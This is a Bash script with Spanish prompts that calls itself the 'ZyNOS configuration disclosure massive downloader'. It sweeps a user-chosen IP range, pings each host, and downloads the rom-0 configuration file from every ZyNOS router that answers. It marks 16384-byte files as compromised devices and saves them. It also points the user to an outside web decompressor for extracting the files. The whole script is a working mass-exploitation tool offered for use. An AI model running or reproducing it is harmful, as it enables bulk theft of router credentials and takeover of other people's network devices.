#!/bin/bash

function menu() {
	clear
	echo "ZyNOS configuration disclosure massive downloader"
	echo "                       _       _ _               "
	echo "    _________  ___ __ | | ___ (_) |_ ___ _ __    "
	echo "   |_  / _ \ \/ / '_ \| |/ _ \| | __/ _ \ '__|   "
	echo "    / /  __/>  <| |_) | | (_) | | ||  __/ |      "
	echo "   /___\___/_/\_\ .__/|_|\___/|_|\__\___|_| 0.01 "
	echo "                |_|                              "
	echo "                                                 "
	echo "                 Coded by hikari                 "
	echo "                                                 "
	read -p "Introdusca el rango de IP: " rang
	read -p "Iniciar escaneo desde: " ini
	read -p "Terminar escaneo en: " fin
	read -p "Introdusca nombre del directoria para guardar archivos de configuracion: " dir
	if [ -d $dir ]
	then
		while [ -d $dir ]
		do
			read -p "Prueba con un nombre diferente a $dir: " dir
		done
	fi
	mkdir $dir ; cd $dir ; clear
	engine $rang
}

function engine() {
	romcount=0
	onlinedevices=0
	echo "Iniciando ataque @ $(date -R)"
	tiempo_inicio=$(date +%r)
	for  (( i=$ini ; i<=$fin ; i++ ))
	do
		ping -w3 -c2 $1.$i > /dev/null
		local retorno_ping=$?
		if [ $retorno_ping -eq 0 ]
		then
			onlinedevices=$(($onlinedevices + 1))
			echo "[+] $1.$i esta online, procediendo a descargar rom-0..." 
			wget --timeout 3 --tries 2 $1.$i/rom-0 2> /dev/null
			local retorno_wget=$?
			if [[ $retorno_wget -eq 0 && -e rom-0 ]]
			then
				if [ $(stat -c %s rom-0) -eq 16384 ]
				then
					echo "[+] $1.$i vulnerado, renombrando rom-0 y pasando a $1.$(($i + 1))..." && romcount=$(($romcount + 1))
					mv rom-0 rom-$romcount-$1.$i
				else
					rm rom-0 > /dev/null
					echo "[+] $1.$i no es un dispositivo vulnerable, probando con $1.$(($i + 1))..."
				fi
			else
				echo "[+] $1.$i no es un dispositivo vulnerable, probando con $1.$(($i + 1))..."
			fi
		else
			echo "[-] $1.$i no esta online, probando con $1.$(($i + 1))..."
		fi
	done
	tiempo_final=$(date +%r)
	finalmessage
}

function finalmessage(){
	clear
	echo "           _____                   _         "
	echo "          |  __ \                 | |        "
	echo "          | |  | | ___  _ __   ___| |        "
	echo "          | |  | |/ _ \| '_ \ / _ \ |        "
	echo "          | |__| | (_) | | | |  __/_|        "
	echo "          |_____/ \___/|_| |_|\___(_)        "
	echo "                                             "                                      
	echo "               Trabajo terminado             "
	echo "  Encuentra todos tus ficheros en: ./$dir    "
	echo "  Descompresor: http://50.57.229.26/zynos.php"
	read -p "  Desea guardar log(s/n): " opc
	case $opc in
	"s" | "S")
		read -p "Nombre del fichero de log: " logname
		makelog $logname
	;;
	"n" | "N")
		exit
	;;
	*)
		clear
		echo "No se reconoce esa opcion... Saliendo y creando log por defecto."
		sleep 2
		makelog "zexploiter-$rang"
		exit
	;;
	esac
}

function makelog() {
	echo "Dispositivos online: $onlinedevices" > $1.log
	echo "Dispositivos vulnerados: $romcount" >> $1.log
	echo "Fecha: $(date +%D)" >> $1.log
	echo "Hora de inicio de escaneo: $tiempo_inicio" >> $1.log
	echo "Hora de finalizacion de escaneo: $tiempo_final" >> $1.log
	echo "Descompresor: http://50.57.229.26/zynos.php" >> $1.log
	read -p "Log creado, presione [Enter] para salir..."
	clear
	exit
}

menu